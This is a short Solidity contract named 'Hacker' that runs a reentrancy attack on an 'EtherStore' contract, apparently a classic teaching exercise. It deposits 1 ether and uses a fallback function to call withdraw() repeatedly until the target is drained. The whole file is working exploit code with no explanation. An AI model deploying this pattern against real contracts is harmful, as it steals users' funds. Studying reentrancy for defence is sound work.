// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IEtherStore {
    function depositFounds() external payable;
    function withdraw() external;
}

contract Hacker {
    IEtherStore public EtherStore;

    constructor(address addressStore) {
        EtherStore = IEtherStore(addressStore);
    }

    function hack() external payable {
        require(msg.value == 1 ether, "Error");

        EtherStore.depositFounds{value: 1 ether}();
        EtherStore.withdraw();
    }

    fallback() external payable {
        if (address(EtherStore).balance >= 1 ether) {
            EtherStore.withdraw();
        }
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}